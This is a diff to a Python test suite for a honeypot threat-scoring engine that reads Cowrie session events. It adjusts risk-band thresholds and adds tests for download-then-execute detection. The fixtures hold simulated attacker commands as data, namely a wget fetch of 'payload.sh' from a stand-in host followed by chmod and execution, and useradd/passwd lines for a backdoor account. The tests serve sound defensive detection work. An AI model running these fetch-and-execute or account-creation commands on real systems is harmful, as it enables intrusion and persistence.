@@ -46,7 +46,7 @@ def test_download_then_execute_chain():
     assert r["dimensions"]["weaponization"] == 25          # 6 download + 15 execute + 5 chain, capped
     assert any("Download -> Execute" in e["reason"] for e in r["explanations"])
     assert any(a["severity"] == "CRITICAL" for a in r["alerts"])
-    assert r["threatScore"] == 40 and r["riskLevel"] == "MEDIUM"   # same maths as the original JS engine
+    assert r["threatScore"] == 70 and r["riskLevel"] == "CRITICAL"   # confirmed download-to-execution chain
 
 
 def test_execute_before_download_is_not_a_chain():
@@ -81,3 +81,33 @@ def test_reading_passwd_file_is_not_account_creation():
 def test_real_account_creation_is_still_caught():
     events = [ev("cowrie.login.success", username="x")] + cmds("useradd -m bob", "sudo passwd bob")
     assert any(a["title"] == "Backdoor Account Created" for a in evaluate_session(events)["alerts"])
+
+
+
+def test_risk_bands_use_calibrated_thresholds():
+    from app.correlation import risk_level
+    assert risk_level(0) == "LOW"
+    assert risk_level(19) == "LOW"
+    assert risk_level(20) == "MEDIUM"
+    assert risk_level(39) == "MEDIUM"
+    assert risk_level(40) == "HIGH"
+    assert risk_level(69) == "HIGH"
+    assert risk_level(70) == "CRITICAL"
+    assert risk_level(100) == "CRITICAL"
+
+
+def test_chmod_alone_is_not_payload_execution():
+    events = [ev("cowrie.login.success", username="x")] + cmds("chmod +x harmless.sh")
+    r = evaluate_session(events)
+    assert r["summary"]["executionCount"] == 0
+    assert not any(a["title"] == "Malicious Payload Execution" for a in r["alerts"])
+
+
+def test_confirmed_download_execute_chain_gets_critical_session_score():
+    events = [ev("cowrie.login.success", username="root"),
+              ev("cowrie.command.input", input="wget http://example.test/payload.sh"),
+              ev("cowrie.command.input", input="chmod +x payload.sh"),
+              ev("cowrie.command.input", input="./payload.sh")]
+    r = evaluate_session(events)
+    assert r["threatScore"] >= 70
+    assert r["riskLevel"] == "CRITICAL"
